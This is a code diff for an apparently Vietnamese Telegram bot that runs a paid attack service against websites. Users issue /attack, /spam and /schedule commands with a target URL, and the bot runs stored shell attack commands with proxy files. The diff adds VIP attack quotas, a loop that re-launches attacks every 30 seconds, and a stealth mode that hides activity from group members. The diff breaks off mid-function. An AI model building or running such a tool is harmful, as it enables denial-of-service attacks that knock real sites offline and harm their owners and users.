@@ -1,3 +1,12 @@
+"""
+========================================
+Developer & create scipt:
+t.me/zentra999
+t.me/anhba999
+New version: 23/3/2026
+========================================
+"""
+# Bạn có thể tiếp tục với mã nguồn của mình ở đây
 import time, asyncio, socket, requests, os, httpx, sqlite3, psutil, random, string
 from urllib import parse
 from datetime import datetime, timedelta
@@ -14,19 +23,29 @@ DB_FILE = 'bot_database.db'
 active_users = {}      
 user_cooldowns = {}    
 COOLDOWN_TIME = 30     
-scheduled_tasks = {}   # Bộ nhớ đệm lưu các lịch hẹn ngầm
+scheduled_tasks = {}
+looping_tasks = {}
 
 # --- DATABASE LOGIC ---
 def init_db():
     with sqlite3.connect(DB_FILE) as conn:
         c = conn.cursor()
         c.execute('CREATE TABLE IF NOT EXISTS methods (name TEXT PRIMARY KEY, type TEXT, url TEXT, time INTEGER, visibility TEXT, command TEXT)')
-        c.execute('CREATE TABLE IF NOT EXISTS vip_users (user_id INTEGER PRIMARY KEY)')
         c.execute('CREATE TABLE IF NOT EXISTS groups_allowed (group_id INTEGER PRIMARY KEY)')
         c.execute('CREATE TABLE IF NOT EXISTS blacklist (domain TEXT PRIMARY KEY)')
         c.execute('CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)')
+        
+        # Bảng VIP được nâng cấp thêm cột quyền hạn Spam và Schedule
+        c.execute('CREATE TABLE IF NOT EXISTS vip_users (user_id INTEGER PRIMARY KEY, max_time INTEGER, quota INTEGER, can_spam INTEGER DEFAULT 1, can_schedule INTEGER DEFAULT 1)')
+        try: 
+            c.execute('ALTER TABLE vip_users ADD COLUMN max_time INTEGER DEFAULT 60')
+            c.execute('ALTER TABLE vip_users ADD COLUMN quota INTEGER DEFAULT 10')
+            c.execute('ALTER TABLE vip_users ADD COLUMN can_spam INTEGER DEFAULT 1')
+            c.execute('ALTER TABLE vip_users ADD COLUMN can_schedule INTEGER DEFAULT 1')
+        except: pass
+
         c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("bot_active", "1")')
-        c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES ("stealth_mode", "0")')
+        c.execute('REPLACE INTO settings (key, value) VALUES ("stealth_mode", "1")')
         conn.commit()
 
 def db_query(query, params=(), fetch=False):
@@ -65,15 +84,32 @@ def lay_ip_va_isp(url):
 
 def get_thoi_gian_vn(): return datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%H:%M:%S | %d-%m-%Y')
 
-# --- CÔNG TẮC BẬT/TẮT TÀNG HÌNH ---
+# --- CÔNG TẮC TÀNG HÌNH ---
 async def toggle_botro(update, context):
     if not is_admin(update.message.from_user.id): return
     current_mode = get_stealth_mode()
     new_mode = not current_mode
     set_stealth_mode(new_mode)
-    
-    status_text = "🟢 BẬT (Bơ tất cả mọi người trong Group, chỉ báo cáo về Inbox Admin)" if new_mode else "🔴 TẮT (Bot trả lời công khai trong Group)"
+    status_text = "🟢 BẬT (Bơ tất cả mọi người trong Group)" if new_mode else "🔴 TẮT (Trả lời công khai trong Group)"
     await update.message.reply_text(f"👻 <b>CÔNG TẮC /BOTRO:</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\nTrạng thái: <code>{status_text}</code>", parse_mode='HTML')
+
+# --- LỆNH XEM THÔNG TIN VIP CÁ NHÂN ---
+async def thong_tin_vip(update, context):
+    user_id = update.message.from_user.id
+    is_private = update.message.chat.type == 'private'
+    if get_stealth_mode() and not is_private: return 
+
+    if is_admin(user_id):
+        return await update.message.reply_text("👑 <b>Bạn là ADMIN:</b>\nĐặc quyền vô hạn.", parse_mode='HTML')
+    
+    vip_info = db_query('SELECT max_time, quota, can_spam, can_schedule FROM vip_users WHERE user_id=?', (user_id,), fetch=True)
+    if vip_info:
+        max_time, quota, can_spam, can_schedule = vip_info[0]
+        spam_st = "✅ Cho phép" if can_spam else "❌ Bị cấm"
+        sch_st = "✅ Cho phép" if can_schedule else "❌ Bị cấm"
+        await update.message.reply_text(f"💎 <b>THÔNG TIN VIP CỦA BẠN</b> 💎\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n├ 🆔 <b>ID:</b> <code>{user_id}</code>\n├ ⏳ <b>Giới hạn:</b> Tối đa <code>{max_time}s</code> / Lần\n├ 🚀 <b>Lượt tấn công:</b> <code>{quota}</code> lượt\n├ 🔄 <b>Quyền Auto-Spam:</b> {spam_st}\n└ ⏰ <b>Quyền Đặt Lịch:</b> {sch_st}\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n💡 <i>Liên hệ Admin để nạp thêm lượt.</i>", parse_mode='HTML')
+    else:
+        await update.message.reply_text("👤 <b>Bạn là Member thường.</b>\nChỉ được sử dụng các kỹ thuật [FREE].", parse_mode='HTML')
 
 # --- CÁC HÀM TIỆN ÍCH ---
 async def check_website(update, context):
@@ -94,7 +130,7 @@ async def check_website(update, context):
             sc = resp.status_code
             icon = "🟢" if 200 <= sc < 300 else "🟡" if sc < 400 else "🔴"
             res = f"🌐 <b>NETWORK SCANNER</b> 🌐\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n🎯 <b>Mục tiêu:</b> <code>{url}</code>\n🚦 <b>Trạng thái:</b> {icon} <code>{sc}</code>\n⚡ <b>Ping:</b> <code>{ms}ms</code>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
-    except: res = "❌ <b>LỖI KẾT NỐI</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n⚠️ <i>Host không phản hồi hoặc timeout.</i>"
+    except: res = "❌ <b>LỖI KẾT NỐI</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n⚠️ <i>Host không phản hồi.</i>"
     await sent_msg.edit_text(res, parse_mode='HTML')
 
 async def danh_sach_phuong_thuc(update, context):
@@ -112,7 +148,6 @@ async def danh_sach_phuong_thuc(update, context):
         vip.append(line) if data.get('visibility') == 'VIP' else free.append(line)
     if vip: msg += "👑 <b>Lớp Kỹ Thuật VIP:</b>\n" + "\n".join(vip) + "\n\n"
     if free: msg += "👤 <b>Lớp Kỹ Thuật FREE:</b>\n" + "\n".join(free) + "\n"
-    msg += "\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n💡 <i>Cú pháp: /attack [tên] [url]</i>"
     await update.message.reply_text(msg, parse_mode='HTML')
 
 async def help_group(update, context):
@@ -127,19 +162,22 @@ async def help_group(update, context):
         "🤖 <b>SYSTEM COMMAND CENTER</b> 🤖\n━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👋 <b>Welcome,</b> <code>{username}</code>!\n\n"
         "⚔️ <b>[ KHU VỰC TẤN CÔNG ]</b>\n"
-        " ├ 🚀 <code>/attack [method] [url]</code>\n"
+        " ├ 🚀 <code>/attack [method] [url] [time]</code>\n"
+        " ├ 🔄 <code>/spam [method] [url]</code>\n"
+        " ├ ⏹ <code>/stopspam</code>\n"
         " ├ ⏰ <code>/schedule [HH:MM] [method] [url]</code>\n"
         " ├ 🗑 <code>/delschedule [Mã Task]</code>\n"
         " └ 🛑 <code>/pkill</code> <i>(Dừng mọi tiến trình)</i>\n\n"
         "🛠 <b>[ CÔNG CỤ TIỆN ÍCH ]</b>\n"
-        " ├ 🔍 <code>/check [url]</code> <i>(Ping host)</i>\n"
-        " └ 📋 <code>/methods</code> <i>(List kỹ thuật)</i>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n💡 <i>Tip: Chỉ hoạt động trong nhóm đã cấp phép.</i>"
+        " ├ 👤 <code>/me</code> <i>(Kiểm tra lượt VIP)</i>\n"
+        " ├ 🔍 <code>/check [url]</code>\n"
+        " └ 📋 <code>/methods</code>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━"
     )
-    kb = InlineKeyboardMarkup([[InlineKeyboardButton("👨‍💻 Liên Hệ Admin", url="https://t.me/ahba999")]])
+    kb = InlineKeyboardMarkup([[InlineKeyboardButton("👨‍💻 Liên Hệ Admin", url="https://t.me/zentra999")]])
     await update.message.reply_text(help_text, parse_mode='HTML', reply_markup=kb)
 
-# --- PANEL: LÊN LỊCH & HỦY LỊCH (DÀNH CHO VIP) ---
+# --- PANEL: LÊN LỊCH & HỦY LỊCH ---
 async def dat_lich(update, context):
     user_id = update.message.from_user.id
     is_stealth = get_stealth_mode()
@@ -154,39 +192,58 @@ async def dat_lich(update, context):
     allowed_groups = [r[0] for r in db_query('SELECT group_id FROM groups_allowed', fetch=True)]
     if not is_private and update.message.chat.id not in allowed_groups and not is_admin(user_id): return await reply_error("🚫 <b>Nhóm chưa được cấp phép.</b>")
 
-    vip_users = [r[0] for r in db_query('SELECT user_id FROM vip_users', fetch=True)]
-    if not is_admin(user_id) and user_id not in vip_users: return await reply_error("🔒 <b>Tính năng Tự động Lên lịch chỉ dành riêng cho Đặc Quyền VIP!</b>")
+    # --- KIỂM TRA QUOTA VÀ QUYỀN ĐẶT LỊCH ---
+    vip_info = db_query('SELECT max_time, quota, can_spam, can_schedule FROM vip_users WHERE user_id=?', (user_id,), fetch=True)
+    is_vip = bool(vip_info)
 
-    if len(context.args) < 3: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/schedule HH:MM [method] [url]</code>\nVD: <code>/schedule 14:30 TLS-SUPER https://example.com</code>")
+    if not is_admin(user_id):
+        if not is_vip: return await reply_error("🔒 <b>Tính năng yêu cầu đặc quyền VIP.</b>")
+        if not vip_info[0][3]: return await reply_error("🚫 <b>Tài khoản của bạn KHÔNG được cấp quyền Đặt lịch!</b>")
+
+    if len(context.args) < 3: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/schedule HH:MM [method] [url]</code>")
 
     time_str, method_name, url = context.args[0], context.args[1], context.args[2]
+    methods_data = get_all_methods()
+    if method_name not in methods_data: return await reply_error("❌ <b>Phương thức không tồn tại!</b>")
+    method = methods_data[method_name]
+
+    if method['visibility'] == 'VIP' and not is_admin(user_id) and not is_vip: 
+        return await reply_error("🔒 <b>Tính năng yêu cầu đặc quyền VIP.</b>")
+
+    attack_time = method['time']
+    if not is_admin(user_id) and is_vip:
+        max_time, quota, _, _ = vip_info[0]
+        if quota <= 0: return await reply_error("❌ <b>Tài khoản VIP của bạn đã hết lượt!</b> Vui lòng nạp thêm.")
+        if attack_time > max_time: attack_time = max_time
+        # Trừ ngay 1 Quota để giữ chỗ
+        db_query('UPDATE vip_users SET quota = quota - 1 WHERE user_id=?', (user_id,))
 
     try:
         vn_tz = timezone('Asia/Ho_Chi_Minh')
         now = datetime.now(vn_tz)
-        target_time = datetime.strptime(time_str, "%H:%M").replace(year=now.year, month=now.month, day=now.day, tzinfo=vn_tz)
+        naive_target = datetime.strptime(time_str, "%H:%M").replace(year=now.year, month=now.month, day=now.day)
+        target_time = vn_tz.localize(naive_target)
         if target_time <= now: target_time = target_time + timedelta(days=1)
         delay_seconds = (target_time - now).total_seconds()
     except ValueError:
-        return await reply_error("⚠️ <b>Định dạng thời gian sai!</b> Vui lòng dùng chuẩn 24h (VD: 09:15 hoặc 23:00).")
-
-    methods_data = get_all_methods()
-    if method_name not in methods_data: return await reply_error("❌ <b>Phương thức không tồn tại!</b>")
+        if not is_admin(user_id) and is_vip: db_query('UPDATE vip_users SET quota = quota + 1 WHERE user_id=?', (user_id,)) 
+        return await reply_error("⚠️ <b>Định dạng thời gian sai!</b>")
         
     blacklist = [r[0] for r in db_query('SELECT domain FROM blacklist', fetch=True)]
-    if parse.urlsplit(url).netloc.lower() in blacklist: return await reply_error("🛡️ <b>Mục tiêu nằm trong Blacklist!</b>")
+    if parse.urlsplit(url).netloc.lower() in blacklist: 
+        if not is_admin(user_id) and is_vip: db_query('UPDATE vip_users SET quota = quota + 1 WHERE user_id=?', (user_id,))
+        return await reply_error("🛡️ <b>Mục tiêu nằm trong Blacklist!</b>")
 
     ip, isp_info = lay_ip_va_isp(url)
-    if not ip: return await reply_error("🌐 <b>Lỗi DNS: Không phân giải được IP.</b>")
+    if not ip: 
+        if not is_admin(user_id) and is_vip: db_query('UPDATE vip_users SET quota = quota + 1 WHERE user_id=?', (user_id,))
+        return await reply_error("🌐 <b>Lỗi DNS.</b>")
 
-    attack_time = methods_data[method_name]['time']
-    cmd = methods_data[method_name]['command'].replace(methods_data[method_name]['url'], url).replace(str(methods_data[method_name]['time']), str(attack_time))
+    cmd = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
     username = update.message.from_user.username or update.message.from_user.full_name
 
-    # Tạo Task ID ngẫu nhiên (6 ký tự)
     task_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
-
-    await reply_error(f"✅ <b>[TIMER SET]</b> Yêu cầu đã được đưa vào hệ thống!\n⏰ Tự động kích hoạt: <code>{target_time.strftime('%H:%M | %d/%m/%Y')}</code>\n⏳ Đếm ngược chờ: <code>{int(delay_seconds)}</code> giây.\n\n🆔 <b>Mã Hủy Lịch:</b> <code>{task_id}</code>\n💡 <i>(Gõ /delschedule {task_id} để hủy)</i>")
+    await reply_error(f"✅ <b>[TIMER SET]</b> Đã đặt lịch (Trừ 1 lượt).\n⏰ Kích hoạt lúc: <code>{target_time.strftime('%H:%M | %d/%m')}</code>\n🆔 <b>Mã Hủy:</b> <code>{task_id}</code>")
 
     task = asyncio.create_task(run_scheduled_attack(delay_seconds, cmd, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private, task_id))
     scheduled_tasks[task_id] = {'task': task, 'user_id': user_id, 'target': url}
@@ -195,63 +252,152 @@ async def huy_lich(update, context):
     user_id = update.message.from_user.id
     is_stealth = get_stealth_mode()
     is_private = update.message.chat.type == 'private'
-
     async def reply_error(text):
         if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')
 
     if len(context.args) < 1: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/delschedule [Mã Task]</code>")
     task_id = context.args[0].upper()
 
-    if task_id not in scheduled_tasks: return await reply_error("❌ <b>Không tìm thấy mã lịch hẹn này hoặc nó đã chạy xong!</b>")
-
+    if task_id not in scheduled_tasks: return await reply_error("❌ <b>Không tìm thấy mã lịch hẹn!</b>")
     task_info = scheduled_tasks[task_id]
-    if task_info['user_id'] != user_id and not is_admin(user_id): return await reply_error("🚫 <b>Bạn không có quyền hủy lịch của người khác!</b>")
+    
+    if task_info['user_id'] != user_id and not is_admin(user_id): 
+        return await reply_error("🚫 <b>Bạn không có quyền hủy lịch của người khác!</b>")
 
-    # Hủy tác vụ ngầm
     task_info['task'].cancel()
     del scheduled_tasks[task_id]
-    await reply_error(f"🗑 <b>Đã hủy bỏ thành công lịch hẹn:</b> <code>{task_id}</code>\n🎯 Mục tiêu thoát nạn: <i>{task_info['target']}</i>")
+    
+    # Hoàn trả lại 1 Quota nếu là VIP
+    if not is_admin(user_id):
+        db_query('UPDATE vip_users SET quota = quota + 1 WHERE user_id=?', (task_info['user_id'],))
+        
+    await reply_error(f"🗑 <b>Đã hủy bỏ lịch hẹn:</b> <code>{task_id}</code> (Hoàn +1 Lượt tấn công)")
 
 async def run_scheduled_attack(delay, command, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private, task_id):
-    try:
-        await asyncio.sleep(delay)
-    except asyncio.CancelledError:
-        return # Nếu bị cancel thì thoát hàm ngay lập tức
+    try: await asyncio.sleep(delay)
+    except asyncio.CancelledError: return 
 
-    if task_id in scheduled_tasks:
-        del scheduled_tasks[task_id]
+    if task_id in scheduled_tasks: del scheduled_tasks[task_id]
 
     current_stealth = get_stealth_mode()
     dashboard = (
-        "⏰ <b>[AUTO RUN] TỚI GIỜ LÊN LỊCH</b> ⏰\n"
-        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
-        f"👤 <b>VIP Operator:</b> <code>@{escape(username)}</code>\n"
-        f"🎯 <b>Target:</b> <code>{url}</code>\n"
+        "⏰ <b>[AUTO RUN] TỚI GIỜ LÊN LỊCH</b> ⏰\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
+        f"👤 <b>Operator:</b> <code>@{escape(username)}</code>\n🎯 <b>Target:</b> <code>{url}</code>\n"
         f"🔥 <b>Method:</b> <code>{method_name.upper()}</code>\n"
-        f"⏳ <b>Duration:</b> <code>{attack_time}s</code>\n"
-        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
-        f"├ <b>IP:</b> <code>{ip}</code>\n"
-        f"└ <b>ISP:</b> <i>{escape(isp_info.get('isp', 'N/A'))}</i>\n"
-        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
-        f"🕒 <b>Time:</b> <code>{get_thoi_gian_vn()}</code>"
     )
-    kb = InlineKeyboardMarkup([[
-        InlineKeyboardButton("📊 Monitor Host", url=f"https://check-host.net/check-http?host={url}"),
-        InlineKeyboardButton("🛑 Terminate", callback_data="pkill")
-    ]])
-    
     if current_stealth and not is_private:
         for admin in ADMIN_IDS:
-            try: await context.bot.send_message(chat_id=admin, text="🕵️‍♂️ <b>[SHADOW TIMER] Kích hoạt chạy ngầm!</b>\n" + dashboard, parse_mode='HTML', reply_markup=kb)
+            try: await context.bot.send_message(chat_id=admin, text=dashboard, parse_mode='HTML')
             except: pass
     else:
-        try: await update.message.reply_text(dashboard, parse_mode='HTML', reply_markup=kb)
+        try: await update.message.reply_text(dashboard, parse_mode='HTML')
         except: pass
-    
     await thuc_hien_tan_cong(command, update, method_name, context, user_id, current_stealth, is_private)
 
+# --- PANEL: AUTO SPAM ---
+async def bat_spam(update, context):
+    user_id = update.message.from_user.id
+    is_stealth = get_stealth_mode()
+    is_private = update.message.chat.type == 'private'
+    
+    async def reply_error(text):
+        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')
 
-# --- PANEL: ATTACK DASHBOARD (BÌNH THƯỜNG) ---
+    if not get_bot_state() and not is_admin(user_id): return await reply_error("❌ <b>Hệ thống đang bảo trì!</b>")
+    if is_private and not is_admin(user_id): return await reply_error("🚫 <b>Lệnh này chỉ được phép dùng trong Group!</b>")
+        
+    allowed_groups = [r[0] for r in db_query('SELECT group_id FROM groups_allowed', fetch=True)]
+    if not is_private and update.message.chat.id not in allowed_groups and not is_admin(user_id): return await reply_error("🚫 <b>Nhóm chưa được cấp phép.</b>")
+
+    # --- KIỂM TRA QUYỀN SPAM CỦA VIP ---
+    vip_info = db_query('SELECT max_time, quota, can_spam FROM vip_users WHERE user_id=?', (user_id,), fetch=True)
+    is_vip = bool(vip_info)
+
+    if not is_admin(user_id):
+        if not is_vip: return await reply_error("🔒 <b>Tính năng yêu cầu đặc quyền VIP.</b>")
+        if not vip_info[0][2]: return await reply_error("🚫 <b>Tài khoản của bạn KHÔNG được cấp quyền AUTO SPAM!</b>")
+
+    if user_id in looping_tasks: return await reply_error("🔄 <b>Bạn đang có vòng lặp chạy rồi!</b> Dùng /stopspam trước.")
+    if len(context.args) < 2: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/spam [method] [url]</code>")
+
+    method_name, url = context.args[0], context.args[1]
+    methods_data = get_all_methods()
+    if method_name not in methods_data: return await reply_error("❌ <b>Phương thức không tồn tại!</b>")
+        
+    blacklist = [r[0] for r in db_query('SELECT domain FROM blacklist', fetch=True)]
+    if parse.urlsplit(url).netloc.lower() in blacklist: return await reply_error("🛡️ <b>Mục tiêu nằm trong Blacklist!</b>")
+
+    ip, isp_info = lay_ip_va_isp(url)
+    if not ip: return await reply_error("🌐 <b>Lỗi DNS.</b>")
+
+    method = methods_data[method_name]
+    attack_time = method['time']
+    
+    if not is_admin(user_id) and is_vip:
+        max_time, quota, _ = vip_info[0]
+        if quota <= 0: return await reply_error("❌ <b>Tài khoản VIP của bạn đã hết lượt!</b> Vui lòng nạp thêm.")
+        if attack_time > max_time: attack_time = max_time
+        db_query('UPDATE vip_users SET quota = quota - 1 WHERE user_id=?', (user_id,)) 
+
+    cmd = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
+    username = update.message.from_user.username or update.message.from_user.full_name
+
+    await reply_error("🔥 <b>[AUTO SPAM KÍCH HOẠT]</b>\nSẽ tự động trừ 1 lượt sau mỗi 30s. Dùng <code>/stopspam</code> để kết thúc!")
+
+    task = asyncio.create_task(run_spam_loop(cmd, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private))
+    looping_tasks[user_id] = {'task': task, 'target': url}
+
+async def tat_spam(update, context):
+    user_id = update.message.from_user.id
+    is_stealth = get_stealth_mode()
+    is_private = update.message.chat.type == 'private'
+
+    async def reply_error(text):
+        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')
+
+    if user_id not in looping_tasks: return await reply_error("❌ <b>Bạn không có vòng lặp nào đang chạy!</b>")
+
+    looping_tasks[user_id]['task'].cancel()
+    del looping_tasks[user_id]
+    await reply_error("✅ <b>Đã tắt chế độ AUTO SPAM thành công.</b>")
+
+async def run_spam_loop(command, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private):
+    loop_count = 1
+    try:
+        while True:
+            if loop_count > 1 and not is_admin(user_id):
+                vip_check = db_query('SELECT quota FROM vip_users WHERE user_id=?', (user_id,), fetch=True)
+                if vip_check and vip_check[0][0] <= 0:
+                    try: await context.bot.send_message(user_id, "❌ <b>Hết Quota!</b> Vòng lặp Spam tự động dừng.", parse_mode='HTML')
+                    except: pass
+                    if user_id in looping_tasks: del looping_tasks[user_id]
+                    return
+                if vip_check:
+                    db_query('UPDATE vip_users SET quota = quota - 1 WHERE user_id=?', (user_id,))
+
+            current_stealth = get_stealth_mode()
+            dashboard = (
+                f"🔄 <b>[AUTO SPAM - LƯỢT {loop_count}]</b> (-1 Lượt) 🔄\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
+                f"👤 <b>VIP:</b> <code>@{escape(username)}</code>\n🎯 <b>Target:</b> <code>{url}</code>\n"
+                f"🔥 <b>Method:</b> <code>{method_name.upper()}</code>\n"
+            )
+            if current_stealth and not is_private:
+                for admin in ADMIN_IDS:
+                    try: await context.bot.send_message(chat_id=admin, text=dashboard, parse_mode='HTML')
+                    except: pass
+            else:
+                try: await update.message.reply_text(dashboard, parse_mode='HTML')
+                except: pass
+
+            process = await asyncio.create_subprocess_shell(command)
+            await process.communicate()
+
+            loop_count += 1
+            await asyncio.sleep(30)
+            
+    except asyncio.CancelledError: return
+
+# --- PANEL: ATTACK DASHBOARD (CHẠY 1 LẦN CÓ QUOTA) ---
 async def tao_choi(update, context):
     user_id = update.message.from_user.id
     is_stealth = get_stealth_mode()
@@ -267,11 +413,12 @@ async def tao_choi(update, context):
     if not is_private and update.message.chat.id not in allowed_groups and not is_admin(user_id): return await reply_error("🚫 <b>Nhóm chưa được cấp phép.</b>")
         
     if not is_admin(user_id):
+        if user_id in looping_tasks: return await reply_error("🔄 <b>Bạn đang ở chế độ AUTO SPAM!</b> Tắt nó bằng /stopspam trước.")
         if active_users.get(user_id, False): return await reply_error("⏳ <b>Bạn đang có 1 tiến trình đang chạy!</b> Vui lòng chờ nó kết thúc.")
         time_passed = time.time() - user_cooldowns.get(user_id, 0)
         if time_passed < COOLDOWN_TIME: return await reply_error(f"❄️ <b>Hệ thống làm mát:</b> Vui lòng đợi <code>{int(COOLDOWN_TIME - time_passed)}s</code>.")
 
-    if len(context.args) < 2: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/attack [method] [url]</code>")
+    if len(context.args) < 2: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/attack [method] [url] [thời gian]</code>")
 
     method_name, url = context.args[0], context.args[1]
     methods_data = get_all_methods()
@@ -280,19 +427,29 @@ async def tao_choi(update, context):
     blacklist = [r[0] for r in db_query('SELECT domain FROM blacklist', fetch=True)]
     if parse.urlsplit(url).netloc.lower() in blacklist: return await reply_error("🛡️ <b>Mục tiêu nằm trong Blacklist!</b>")
 
-    vip_users = [r[0] for r in db_query('SELECT user_id FROM vip_users', fetch=True)]
+    vip_info = db_query('SELECT max_time, quota FROM vip_users WHERE user_id=?', (user_id,), fetch=True)
+    is_vip = bool(vip_info)
     method = methods_data[method_name]
-    if method['visibility'] == 'VIP' and not is_admin(user_id) and user_id not in vip_users: return await reply_error("🔒 <b>Yêu cầu đặc quyền VIP.</b>")
+
+    if method['visibility'] == 'VIP' and not is_admin(user_id) and not is_vip: 
+        return await reply_error("🔒 <b>Yêu cầu đặc quyền VIP.</b>")
 
     ip, isp_info = lay_ip_va_isp(url)
-    if not ip: return await reply_error("🌐 <b>Lỗi DNS: Không phân giải được IP.</b>")
+    if not ip: return await reply_error("🌐 <b>Lỗi DNS.</b>")
 
-    username = update.message.from_user.username or update.message.from_user.full_name
     attack_time = method['time']
-    if is_admin(user_id) and len(context.args) > 2:
+    if len(context.args) > 2:
         try: attack_time = int(context.args[2])
         except: pass
 
+    # --- KIỂM TRA VÀ TRỪ QUOTA VIP ---
+    if not is_admin(user_id) and is_vip:
+        max_time, quota = vip_info[0]
+        if quota <= 0: return await reply_error("❌ <b>Tài khoản VIP của bạn đã hết lượt tấn công!</b>")
+        if attack_time > max_time: attack_time = max_time # Ép thời gian
+        db_query('UPDATE vip_users SET quota = quota - 1 WHERE user_id=?', (user_id,))
+
+    username = update.message.from_user.username or update.message.from_user.full_name
     dashboard = (
         "⚡ <b>ATTACK LAUNCHED</b> ⚡\n"
         "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
@@ -335,7 +492,7 @@ async def thuc_hien_tan_cong(command, update, method_name, context, user_id, is_
         
     if is_stealth and not is_private:
         for admin in ADMIN_IDS:
-            try: await context.bot.send_message(chat_id=admin, text=f"{res} (Tự động từ: {user_id})", parse_mode='HTML')
+            try: await context.bot.send_message(chat_id=admin, text=f"{res} (Từ ID: {user_id})", parse_mode='HTML')
             except: pass
     else:
         try: await context.bot.send_message(update.message.chat.id, res, parse_mode='HTML')
@@ -343,30 +500,46 @@ async def thuc_hien_tan_cong(command, update, method_name, context, user_id, is_
 
 # --- QUẢN TRỊ ADMIN ---
 async def vps_stats(update, context):
+    if get_stealth_mode() and update.message.chat.type != 'private': return
     if not is_admin(update.message.from_user.id): return
     cpu, ram = psutil.cpu_percent(interval=0.5), psutil.virtual_memory()
     await update.message.reply_text(f"🖥 <b>SERVER MONITORING</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n├ ⚙️ <b>CPU:</b> <code>{cpu}%</code>\n└ 🧠 <b>RAM:</b> <code>{ram.percent}%</code> <i>({ram.used/(1024**3):.2f}GB / {ram.total/(1024**3):.2f}GB)</i>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰", parse_mode='HTML')
+
+async def danh_sach_proxy(update, context):
+    if get_stealth_mode() and update.message.chat.type != 'private': return
+    if not is_admin(update.message.from_user.id): return
+
+    try:
+        txt_files = [f for f in os.listdir('.') if os.path.isfile(f) and f.endswith('.txt')]
+        if not txt_files: return await update.message.reply_text("📭 <b>Không tìm thấy file .txt nào.</b>", parse_mode='HTML')
+
+        msg = "📂 <b>DANH SÁCH FILE PROXY (.txt)</b> 📂\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
+        for file in txt_files:
+            try:
+                with open(file, 'r', encoding='utf-8') as f: line_count = sum(1 for line in f if line.strip())
+                msg += f"📄 <code>{file}</code> - <b>{line_count:,}</b> proxies\n"
+            except Exception: msg += f"📄 <code>{file}</code> - <i>Lỗi đọc file</i>\n"
+        await update.message.reply_text(msg, parse_mode='HTML')
+    except Exception as e: await update.message.reply_text(f"❌ <b>Lỗi:</b> {str(e)}", parse_mode='HTML')
 
 async def stop_process(update, context):
     if not is_admin(update.effective_user.id):
         if update.callback_query: await update.callback_query.answer("🚫 Bạn không có quyền!", show_alert=True)
         return
     try:
-        # 1. Kill tiến trình node
         process = await asyncio.create_subprocess_shell("pkill -9 -f node")
         await process.communicate()
-        
-        # 2. Xóa các khóa luồng
         active_users.clear()
-
-        # 3. Hủy TOÀN BỘ các lịch hẹn đang chờ
-        for t_id, t_info in scheduled_tasks.items():
-            t_info['task'].cancel()
+        
+        for t_id, t_info in scheduled_tasks.items(): t_info['task'].cancel()
         scheduled_tasks.clear()
+        
+        for u_id, sp_info in looping_tasks.items(): sp_info['task'].cancel()
+        looping_tasks.clear()
 
     except Exception as e: print(e)
     
-    text = "⏹ <b>Đã dọn dẹp tiến trình Node và Hủy toàn bộ Lịch hẹn!</b>"
+    text = "⏹ <b>Đã dọn dẹp hệ thống: Node, Lịch hẹn và Auto Spam đã bị hủy!</b>"
     if update.callback_query:
         await update.callback_query.answer("Đã dừng khẩn cấp toàn hệ thống!")
         await update.callback_query.message.reply_text(text, parse_mode='HTML')
@@ -399,14 +572,27 @@ async def xoa_phuong_thuc(update, context):
 
 async def quan_ly_vip_user(update, context, action):
     if not is_admin(update.message.from_user.id): return
-    try: uid = int(context.args[0])
-    except: return await update.message.reply_text("⚠️ <b>ID không hợp lệ.</b>", parse_mode='HTML')
     if action == "add":
-        db_query('INSERT OR IGNORE INTO vip_users (user_id) VALUES (?)', (uid,))
-        await update.message.reply_text(f"✅ <b>Đã cấp VIP cho:</b> <code>{uid}</code>", parse_mode='HTML')
+        if len(context.args) < 3:
+            return await update.message.reply_text("⚠️ <b>Cú pháp:</b> <code>/vipuser [id] [thời_gian_tối_đa] [tổng_số_lượt] [spam:1/0] [schedule:1/0]</code>\nVD: <code>/vipuser 123456789 120 50 1 0</code>", parse_mode='HTML')
+        try:
+            uid = int(context.args[0])
+            max_time = int(context.args[1])
+            quota = int(context.args[2])
+            can_spam = int(context.args[3]) if len(context.args) > 3 else 1
